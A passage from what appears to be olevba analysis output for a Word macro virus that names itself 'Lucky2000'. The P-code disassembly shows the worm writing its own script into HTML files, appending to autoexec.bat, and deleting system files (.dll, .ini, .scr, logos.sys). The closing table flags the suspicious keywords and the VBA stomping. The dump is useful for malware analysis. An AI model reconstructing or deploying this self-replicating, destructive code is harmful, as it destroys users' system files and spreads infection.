' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "<body>"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #702:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "Kry.writeline TxtRng.HTMLText"
' 	PrintItemNL 
' Line #703:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Kry.writeline "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0007 "</body>"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #704:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Kry.writeline "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0007 "</html>"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #705:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "Kry.writeline Contents"
' 	PrintItemNL 
' Line #706:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "Kry.Close"
' 	PrintItemNL 
' Line #707:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End If"
' 	PrintItemNL 
' Line #708:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Next"
' 	PrintItemNL 
' Line #709:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "wordobj.Quit"
' 	PrintItemNL 
' Line #710:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #711:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "</SCRIPT>"
' 	PrintItemNL 
' Line #712:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "</body>"
' 	PrintItemNL 
' Line #713:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "</html>"
' 	PrintItemNL 
' Line #714:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #715:
' 	EndIfBlock 
' Line #716:
' 	Ld X 
' 	LitDI2 0x001E 
' 	Eq 
' 	IfBlock 
' Line #717:
' 	LitStr 0x000F "C:\autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #718:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "@echo This a file from Lucky2000 !!!"
' 	PrintItemNL 
' Line #719:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #720:
' 	EndIfBlock 
' Line #721:
' 	Ld X 
' 	LitDI2 0x0028 
' 	Eq 
' 	IfBlock 
' Line #722:
' 	OnError (Resume Next) 
' Line #723:
' 	LitStr 0x0014 "C:\windows\logos.sys"
' 	ArgsCall Kill 0x0001 
' Line #724:
' 	LitStr 0x0017 "C:\windows\system\*.scr"
' 	ArgsCall Kill 0x0001 
' Line #725:
' 	EndIfBlock 
' Line #726:
' 	ExitFunc 
' Line #727:
' 	Label Format_Me 
' Line #728:
' 	LitStr 0x0010 "C:\windows\*.ini"
' 	ArgsCall Kill 0x0001 
' Line #729:
' 	ExitFunc 
' Line #730:
' 	Label NukeDLL 
' Line #731:
' 	LitStr 0x0017 "C:\windows\system\*.dll"
' 	ArgsCall Kill 0x0001 
' Line #732:
' 	ExitFunc 
' Line #733:
' 	EndFunc 
' Line #734:
' 	QuoteRem 0x0000 0x004F " Polymorphic/Stealth/Destructive Word 97/2000/SR-1 Compatibler Macro Virus/Worm"
' Line #735:
' 	QuoteRem 0x0000 0x002A " Self-Replicating HTML Virus HTML/Lucky .a"
' Line #736:
' 	QuoteRem 0x0000 0x0021 " By Lucky2000 the next Generation"
' Line #737:
' 	QuoteRem 0x0000 0x0004 " EOF"
' Line #738:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Exchange.cpl        |Executable file name                         |
|IOC       |FixDvr.cpl          |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

